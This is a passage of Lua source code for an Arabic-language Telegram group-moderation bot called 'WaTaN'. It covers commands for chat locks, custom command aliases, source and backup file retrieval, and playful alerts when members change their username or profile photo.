send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..WaTaNChengUserName..']')
database:del(bot_id.."WaTaN:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if WaTaNChengUserName ~= data.username_ then 
local Text = {
'شكو غيرت معرفك شنو نشروك بقنوات فضايح😂🥺',
"هاها شو غيرت معرفك بس لا هددتك/ج الحب",
"شسالفه شو غيرت معرفك 😐🌝",
"غير معرفه خمطو بساع بساع \n هاذه معرفه : @"..data.username_.."",
'ها عار مو جان معرفك \n شكو غيرته ل @'..data.username_..' ',
'ها يول شو مغير معرفك بيش مشتري يول', 
"منور معرف جديد :  "..data.username_.."",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."WaTaN:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
end
if text == "تفعيل تنبيه الصور" and ChanSub(msg) and Manager(msg) and database:get(bot_id.."AL:AddWaTaN:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تفعيل تنبيه الصور')
database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"open")
end
if text == "تعطيل تنبيه الصور" and ChanSub(msg) and Manager(msg) and database:get(bot_id.."AL:AddWaTaN:stats") == "✔" then
send(msg.chat_id_, msg.id_, '✯︙تم تعطيل تنبيه الصور')
database:set(bot_id.."Ttn:Ph:stats"..msg.chat_id_,"close")
end
if text and database:get(bot_id.."Ttn:Ph:stats"..msg.chat_id_) == "open" then  
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
if data.id_ then 
if data.id_ ~= bot_id then 
local WaTaNChengPhoto = database:get(bot_id.."WaTaN:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if WaTaNChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."WaTaN:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if WaTaNChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
  "شكو غيرت صورتك يلصاك",
  "منور طالع حلو ع صوره جديده",
  "ها يول شو غيرت صورتك😍😂",
  "شكو غيرت صورتك شنو قطيت وحده جديده 😹😹🌚",
  "شو غيرت صورتك شنو تعاركت ويه الحب ؟😹🌞",
  "شكو غيرت الصوره شسالفه ؟؟ 🤔🌞",
}
send(msg.chat_id_, msg.id_,Text[math.random(#Text)])
end  
database:set(bot_id.."WaTaN:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'همسه' or text == 'الهمسه' or text == 'همسة' or text == 'الهمسة' or text == 'اهمس' or text == 'همس' or text == '↫ بوت الهمسه ✯' then
Text = "✯︙اهلا بك عزيزي \n✯︙عليك اضافة هذا البوت @kg7bot الى مجموعتك\n✯︙ثم رفعه مشرفا ثم اتبع الاوامر التاليه [هـنـا](https://t.me/WaTaNTeaM/6499)"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'اضغط هنا لأضافة بوت الهمسه لمجموعتك',url="http://t.me/kg7bot?startgroup=new"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/kg7bot&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'السورس' or text == 'سورس' or text == 'يا سورس' or text == 'ياسورس' then
local url,res = https.request('https://api-watan.ml/ch/joinch.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.Info_WaTaNTeaM ~= true then
send(msg.chat_id_,msg.id_,'✯︙اهلا بك عزيزي ،\n✯︙اشترك في قناة السورس\n✯︙ثم ارسل الامر مره اخرى\n✯︙قناة السورس @WaTaNTeaM')   
return false 
end
Text = "[⦑ Welcome to Source ⦒](t.me/watanteam)\n[✯ ⦑ SOURCE WaTaN ⦒](t.me/watanteam)\n✯ Source version : 3.2"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝒄𝒉𝒂𝒏𝒏𝒆𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/WaTaNTeaM"},
{text = '𝒖𝒑𝒅𝒂𝒕𝒆 𝒔𝒐𝒖𝒓𝒄𝒆',url="t.me/watanupdate"}},
{{text = '𝒊𝒏𝒔𝒕𝒂𝒍𝒍 𝒔𝒐𝒖𝒓𝒄𝒆',url="https://t.me/WaTaNTeaM/7"},
{text = '𝒘𝒂𝒕𝒂𝒏 𝒈𝒓𝒐𝒖𝒑',url="https://t.me/joinchat/MJjy8Vab_jVmODdi"}},
{{text = '𝒅𝒆𝒗𝒆𝒍𝒐𝒑𝒆𝒓',url="t.me/abbasfadhil"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/WaTaNTeaM&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
if text == 'رفع ملف السورس' or text == 'رفع الملف' and DevWaTaN(msg) then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFileSource(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'جلب ملف السورس' and ChanSub(msg) then
if not DevWaTaN(msg) then
send(msg.chat_id_, msg.id_,'✯︙للمطور الاساسي فقط ')
else
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './WaTaN.lua', '✯︙نسخة ملف سورس وطن\n✯︙اصدار *3.2*')
end 
end
if text == 'جلب ملف الردود' and ChanSub(msg) then
if not DevWaTaN(msg) then
send(msg.chat_id_, msg.id_,'✯︙للمطور الاساسي فقط ')
else
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './File_Bot/Reply.lua', '✯︙ملف الردود الخاص بسورس وطن')
end 
end
if text == 'جلب ملف الالعاب' and ChanSub(msg) then
if not DevWaTaN(msg) then
send(msg.chat_id_, msg.id_,'✯︙للمطور الاساسي فقط ')
else
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './File_Bot/games.lua', '✯︙ملف الالعاب الخاص بسورس وطن')
end 
end
if text == 'رفع نسخه الاحتياطيه' and ChanSub(msg) and DevWaTaN(msg) or text == 'رفع النسخه' then   
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile_Bot(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'جلب نسخه الاحتياطيه' and ChanSub(msg) and DevWaTaN(msg) or text == 'جلب النسخه' then 
GetFile_Bot(msg)
end
if text == 'تفعيل الجلب التلقائي' and ChanSub(msg) and DevWaTaN(msg) then  
database:setex(bot_id.."send:file:Groups1",18000,true) 
send(msg.chat_id_, msg.id_,'✯︙تم تفعيل الجلب التلقائي للنسخه الاحتياطيه')
return false
end

if text == 'تعطيل الجلب التلقائي' and ChanSub(msg) and DevWaTaN(msg) then  
database:del(bot_id.."send:file:Groups") 
send(msg.chat_id_, msg.id_,'✯︙تم تعطيل الجلب التلقائي للنسخه الاحتياطيه')
return false
end

if tonumber(database:ttl(bot_id.."send:file:Groups1")) <= 1 then
GetFile_Bot1(msg)
database:setex(bot_id.."send:file:Groups1",18000,true) 
end
if text == 'الاوامر المضافه' and ChanSub(msg) and Constructor(msg) then
local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_..'')
t = " ✯︙قائمه الاوامر المضافه  \nٴ≪━━━━ 𝐖𝐀𝐓𝐀𝐍 ━━━━≫ٴ\n"
for k,v in pairs(list) do
Cmds = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..v)
print(Cmds)
if Cmds then 
t = t..""..k..">> ("..v..") » {"..Cmds.."}\n"
else
t = t..""..k..">> ("..v..") \n"
end
end
if #list == 0 then
t = " ✯︙لا يوجد اوامر مضافه"
end
send(msg.chat_id_, msg.id_,'['..t..']')
end
if text == 'حذف الاوامر المضافه' and ChanSub(msg) or text == 'مسح الاوامر المضافه' then
if Constructor(msg) then 
local list = database:smembers(bot_id..'List:Cmd:Group:New'..msg.chat_id_)
for k,v in pairs(list) do
database:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..v)
database:del(bot_id..'List:Cmd:Group:New'..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,'✯︙تم ازالة جميع الاوامر المضافه')  
end
end
if text == 'اضف امر' and ChanSub(msg) and Constructor(msg) then
database:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_,'true') 
send(msg.chat_id_, msg.id_,'✯︙ارسل الامر القديم')  
return false
end
if text == "ترتيب الاوامر" and ChanSub(msg) and Constructor(msg) then
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":ا","ايدي")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"ا")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":م","رفع مميز")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"م")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":اد","رفع ادمن")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"اد")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":مد","رفع مدير")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"مد")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":من","رفع منشئ")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"من")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":اس","رفع منشئ اساسي")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"اس")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"مط")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":تك","تنزيل الكل")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"تك")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":تعط","تعطيل الايدي بالصوره")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"تعط")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":تفع","تفعيل الايدي بالصوره")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"تفع")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"ر")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"رر")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"،،")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"رد")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"سح")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"رس")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":كت","كت تويت")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"كت")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":لو","لو خيروك")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"لو")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":صص","صراحه")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"صص")
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":رو","روليت")
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,"رو")
send(msg.chat_id_, msg.id_,"✯︙تم ترتيب الاوامر بالشكل التالي ~\n- ايدي - ا .\n- رفع مميز - م .\n-رفع ادمن - اد .\n- رفع مدير - مد . \n- رفع منشى - من . \n- رفع منشئ الاساسي - اس  .\n- رفع مطور - مط .\n-رفع مطور ثانوي - ثانوي .\n- تنزيل الكل - تك .\n- تعطيل الايدي بالصوره - تعط .\n- تفعيل الايدي بالصوره - تفع .\n- الرابط - ر .\n- ردود المدير - رر .\n- مسح المكتومين - ،، .\n- اضف رد - رد .\n- مسح سحكاتي - سح .\n- مسح رسائلي - رس .\n- كت تويت - كت .\n- لو خيروك - لو .\n- صراحه - صص .\n- روليت - رو .")  
end
if text == 'حذف امر' and ChanSub(msg) or text == 'مسح امر' and ChanSub(msg) then 
if Constructor(msg) then
database:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_,'true') 
send(msg.chat_id_, msg.id_,'✯︙ارسل الامر الذي قمت بوضعه بدلا عن القديم')  
return false
end
end
if text and database:get(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_) == 'true' then
database:set(bot_id.."Set:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,'✯︙ارسل الامر الجديد')  
database:del(bot_id.."Set:Cmd:Group"..msg.chat_id_..':'..msg.sender_user_id_)
database:set(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_,'true1') 
return false
end
if text and database:get(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_) == 'true1' then
local NewCmd = database:get(bot_id.."Set:Cmd:Group:New"..msg.chat_id_)
database:set(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..':'..text,NewCmd)
database:sadd(bot_id.."List:Cmd:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,'✯︙تم حفظ الامر')  
database:del(bot_id.."Set:Cmd:Group1"..msg.chat_id_..':'..msg.sender_user_id_)
return false
end
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text == 'قفل الدردشه' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id.."lock:text"..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الدردشه ')
end,nil)   
elseif text == 'قفل الاضافه' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:AddMempar"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯| تـم قفـل اضافة ')
end,nil)   
elseif text == 'قفل الدخول' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Join"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل دخول ')
end,nil)   
elseif text == 'قفل البوتات' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل البوتات ')
end,nil)   
elseif text == 'قفل البوتات بالطرد' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل البوتات بالطرد ')
end,nil)   
elseif text == 'قفل الاشعارات' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then  
database:set(bot_id..'lock:tagservr'..msg.chat_id_,true)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الاشعارات ')
end,nil)   
elseif text == 'قفل التثبيت' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id.."lockpin"..msg.chat_id_, true) 
database:sadd(bot_id..'lock:pin',msg.chat_id_) 
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,data.pinned_message_id_)  end,nil)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل التثبيت ')
end,nil)   
elseif text == 'قفل التعديل' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'lock:edit'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل تعديل ')
end,nil)   
elseif text == 'قفل الفشار' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الفشار ')
end,nil)  
elseif text == 'قفل الفارسيه' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الفارسيه ')
end,nil)   
elseif text == 'قفل الاسيويه' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:asiaoi'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الفارسيه ')
end,nil) 
elseif text == 'قفل الانكليزيه' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Engilsh'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الانكليزيه ')
end,nil)
elseif text == 'قفل الانلاين' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id.."lock:inline"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الانلاين ')
end,nil)
elseif text == 'قفل تعديل الميديا' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'lock_edit_med'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل تعديل ')
end,nil)    
elseif text == 'قفل الكل' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id..'lock:tagservrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lsock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل جميع الاوامر ')
end,nil)   
end
if text == 'قفل الاباحي' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."Abs:Lock:NightClub"..msg.chat_id_,true)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم قفـل الاباحي ')
end,nil)   
elseif text == 'فتح الاباحي' and ChanSub(msg) and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."Abs:Lock:NightClub"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الاباحي ')
end,nil)   
end
if text == 'فتح الانلاين' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:inline"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الانلاين ')
end,nil)
elseif text == 'فتح الاضافه' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:AddMempar"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح اضافة ')
end,nil)   
elseif text == 'فتح الدردشه' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id.."lock:text"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح الدردشه ')
end,nil)   
elseif text == 'فتح الدخول' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Join"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فتح دخول ')
end,nil)   
elseif text == 'فتح البوتات' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فـتح البوتات ')
end,nil)   
elseif text == 'فتح البوتات بالطرد' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فـتح البوتات بالطرد ')
end,nil)   
elseif text == 'فتح الاشعارات' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Mod(msg) then  
database:del(bot_id..'lock:tagservr'..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فـتح الاشعارات ')
end,nil)   
elseif text == 'فتح التثبيت' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id.."lockpin"..msg.chat_id_)  
database:srem(bot_id..'lock:pin',msg.chat_id_)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فـتح التثبيت ')
end,nil)   
elseif text == 'فتح التعديل' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:del(bot_id..'lock:edit'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فـتح تعديل ')
end,nil)   
elseif text == 'فتح الفشار' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fshar'..msg.chat_id_) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'✯︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'WaTaNTeaM')..') \n✯︙تـم فـتح الفشار ')
end,nil)   
elseif text == 'فتح الفارسيه' and ChanSub(msg) and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id..'lock:Fars'..msg.chat_id_) 
